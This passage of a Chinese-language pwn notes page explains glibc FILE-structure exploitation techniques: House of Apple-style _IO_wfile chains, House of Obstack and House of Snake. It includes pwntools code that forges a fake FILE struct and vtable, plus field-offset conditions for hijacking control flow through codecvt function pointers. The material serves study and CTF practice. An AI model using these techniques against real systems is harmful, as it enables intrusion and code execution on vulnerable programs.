</span></span><span class=line><span class=cl><span class=n>rop_addr</span> <span class=o>=</span> <span class=n>frame_addr</span> <span class=o>+</span> <span class=mh>0xf8</span>
</span></span><span class=line><span class=cl><span class=n>buf_addr</span> <span class=o>=</span> <span class=n>rop_addr</span> <span class=o>+</span> <span class=mh>0x60</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>codecvt_addr</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x1000</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_wfile_jumps&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>  <span class=c1># fake vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>frame_addr</span><span class=p>)</span></span></span></code></pre></div></div><p>② <code>_IO_wfile_underflow_mmap</code></p><p><strong>利用</strong></p><p>fp 设置</p><ul><li><code>_flags</code>设置为<code>~4</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end</code>，即满足<code>*A >= *(A + 8)</code></li><li><code>_wide_data->_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt->__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt->__cd_in.step->__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt->__cd_in.step->__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</li></ul><p><strong>调用链</strong>：<code>_IO_wfile_underflow_mmap</code> > <code>__libio_codecvt_in</code> > <code>DL_CALL_FCT</code> > <code>gs = fp->_codecvt->__cd_in.step</code> > <code>*(gs->__fct)(gs)</code></p><p>③ <code>_IO_wdo_write</code></p><p><strong>原理</strong></p><ul><li>满足<code>fp->_IO_write_ptr > fp->_IO_write_base</code></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// _IO_new_file_sync
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>&gt;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>_IO_do_flush</span><span class=p>(</span><span class=n>fp</span><span class=p>))</span> <span class=k>return</span> <span class=n>EOF</span><span class=p>;</span><span class=c1>// 调用到此
</span></span></span></code></pre></div></div><ul><li><code>fp->_mode > 0</code>来调用后者<code>_IO_wdo_write</code></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _IO_do_flush(_f)
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=p>((</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>&lt;=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>   <span class=o>?</span> <span class=nf>_IO_do_write</span><span class=p>(</span><span class=n>_f</span><span class=p>,</span> <span class=p>(</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=p>(</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=o>-</span><span class=p>(</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=o>:</span> <span class=nf>_IO_wdo_write</span><span class=p>(</span><span class=n>_f</span><span class=p>,</span> <span class=p>(</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=p>((</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span>
</span></span><span class=line><span class=cl>            <span class=o>-</span> <span class=p>(</span><span class=n>_f</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>)))</span></span></span></code></pre></div></div><ul><li>需要控制<code>fp->_wide_data</code></li></ul><p><strong>利用</strong></p><p>fp 设置</p><ul><li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li><li><code>_IO_write_ptr > _IO_write_base</code>，即满足<code>*(fp + 0x28) > *(fp + 0x20)</code></li><li><code>_mode > 0</code>，即满足<code>(fp + 0xc0) > 0</code></li><li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li><li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_write_ptr >= _wide_data->_IO_write_base</code>，即满足<code>*(A + 0x20) >= *(A + 0x18)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt->__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li><li><code>codecvt->__cd_out.step->__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt->__cd_out.step->__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</li></ul><p><strong>调用链</strong>：<code>_IO_new_file_sync</code> > <code>_IO_do_flush</code> > <code>_IO_wdo_write</code> > <code>__libio_codecvt_out</code> > <code>DL_CALL_FCT</code> > <code>gs = fp->_codecvt->__cd_out.step</code> > <code>*(gs->__fct)(gs)</code></p><p>④ <code>_IO_wfile_sync</code></p><p>fp 设置</p><ul><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li><li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data->_IO_write_ptr &lt;= _wide_data->_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li><li><code>_wide_data->_IO_read_ptr != _wide_data->_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt->__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt->__cd_in.step->__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li><li><code>codecvt->__cd_in.step->__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt->__cd_in.step->__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt->__cd_in.step_data</code>可控</li></ul><p><strong>调用链</strong>：<code>_IO_wfile_sync</code> > <code>__libio_codecvt_length</code> > <code>DL_CALL_FCT</code> > <code>gs = fp->_codecvt->__cd_in.step</code> > <code>*(gs->__fct)(gs)</code></p><h4 id=house-of-obstack>House of Obstack</h4><ul><li><p>&lt;glibc-2.37，利用<code>_IO_obstack_jumps</code>，其中<code>_IO_obstack_overflow</code>和 <code>_IO_obstack_xsputn</code> 都可触发</p></li><li><p><strong>攻击链</strong></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_IO_obstack_overflow</span>
</span></span><span class=line><span class=cl>        <span class=nf>obstack_1grow</span> <span class=p>(</span><span class=n>obstack</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span> <span class=c1>// c 不可控
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nf>_obstack_newchunk</span> <span class=p>(</span><span class=n>__o</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                         <span class=n>new_chunk</span> <span class=o>=</span> <span class=nf>CALL_CHUNKFUN</span> <span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=n>new_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                     <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>h</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>chunkfun</span><span class=p>)((</span><span class=n>h</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>extra_arg</span><span class=p>,</span> <span class=p>(</span><span class=n>size</span><span class=p>))</span></span></span></code></pre></div></div></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_IO_obstack_xsputn</span>
</span></span><span class=line><span class=cl>        <span class=nf>obstack_grow</span> <span class=p>(</span><span class=n>obstack</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>n</span><span class=p>);;</span>
</span></span><span class=line><span class=cl>                <span class=nf>_obstack_newchunk</span> <span class=p>(</span><span class=n>__o</span><span class=p>,</span> <span class=n>__len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                         <span class=n>new_chunk</span> <span class=o>=</span> <span class=nf>CALL_CHUNKFUN</span> <span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=n>new_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                     <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>h</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>chunkfun</span><span class=p>)((</span><span class=n>h</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>extra_arg</span><span class=p>,</span> <span class=p>(</span><span class=n>size</span><span class=p>))</span></span></span></code></pre></div></div></li></ul><p>实际第一条链易触发<code>assert(c != EOF);</code>，一般选择第二条链</p><p><strong>原理</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>_IO_obstack_file</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>_IO_FILE_plus</span> <span class=n>file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>obstack</span> <span class=o>*</span><span class=n>obstack</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>obstack</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 只列举劫持
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>_obstack_chunk</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>chunkfun</span><span class=p>)</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>,</span> <span class=kt>long</span><span class=p>);</span> <span class=c1>// 需要伪造成劫持的地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>void</span> <span class=o>*</span><span class=n>extra_arg</span><span class=p>;</span> <span class=c1>// 参数
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=nl>use_extra_arg</span> <span class=p>:</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20250126223346993.png alt=图片无法加载><h4 id=house-of-snake>House of Snake</h4><ul><li>glibc-2.37 删除了<code>_IO_obstack_jumps</code>，增加了<code>_IO_printf_buffer_as_file_jumps</code>新<code>_IO_jumps_t</code>结构体，其只有<code>__printf_buffer_as_file_overflow</code>和<code>__printf_buffer_as_file_xsputn</code>2 个函数</li><li>利用<code>__printf_buffer_as_file_overflow</code></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>_IO_jump_t</span> <span class=n>_IO_printf_buffer_as_file_jumps</span> <span class=n>libio_vtable</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>JUMP_INIT_DUMMY</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>finish</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>overflow</span><span class=p>,</span> <span class=n>__printf_buffer_as_file_overflow</span><span class=p>),</span> <span class=c1>// 利用
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>underflow</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>uflow</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>pbackfail</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>xsputn</span><span class=p>,</span> <span class=n>__printf_buffer_as_file_xsputn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>xsgetn</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>seekoff</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>seekpos</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>setbuf</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>sync</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>doallocate</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>read</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>write</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>seek</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>close</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>stat</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>showmanyc</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>imbue</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><p><strong>原理</strong></p><p><code>__printf_buffer_as_file_overflow</code>函数</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>__printf_buffer_as_file_overflow</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>ch</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 将 FILE 结构体 fp 转换为 __printf_buffer_as_file 类型
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>__printf_buffer_as_file</span> <span class=o>*</span><span class=n>file</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>__printf_buffer_as_file</span> <span class=o>*</span><span class=p>)</span> <span class=n>fp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    struct __printf_buffer_as_file
</span></span></span><span class=line><span class=cl><span class=cm>    {
</span></span></span><span class=line><span class=cl><span class=cm>      FILE stream;
</span></span></span><span class=line><span class=cl><span class=cm>      const struct _IO_jump_t *vtable;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      struct __printf_buffer *next;
</span></span></span><span class=line><span class=cl><span class=cm>    };
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    struct __printf_buffer
</span></span></span><span class=line><span class=cl><span class=cm>    {
</span></span></span><span class=line><span class=cl><span class=cm>      char *write_base;
</span></span></span><span class=line><span class=cl><span class=cm>      char *write_ptr;
</span></span></span><span class=line><span class=cl><span class=cm>      char *write_end;
</span></span></span><span class=line><span class=cl><span class=cm>      uint64_t written;
</span></span></span><span class=line><span class=cl><span class=cm>      enum __printf_buffer_mode mode;
</span></span></span><span class=line><span class=cl><span class=cm>    };
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>__printf_buffer_as_file_commit</span> <span class=p>(</span><span class=n>file</span><span class=p>);</span> <span class=c1>// 进行了一系列断言检查
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>ch</span> <span class=o>!=</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>__printf_buffer_putc</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>,</span> <span class=n>ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// if判断条件1需要满足: buf-&gt;mode != __printf_buffer_mode_failed
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>__printf_buffer_has_failed</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=o>&amp;&amp;</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_ptr</span> <span class=o>==</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>write_end</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>__printf_buffer_flush</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>);</span> <span class=c1>// 到此处
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>__printf_buffer_as_file_switch_to_buffer</span> <span class=p>(</span><span class=n>file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>__printf_buffer_has_failed</span> <span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=p>)</span> <span class=n>ch</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>检查绕过</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
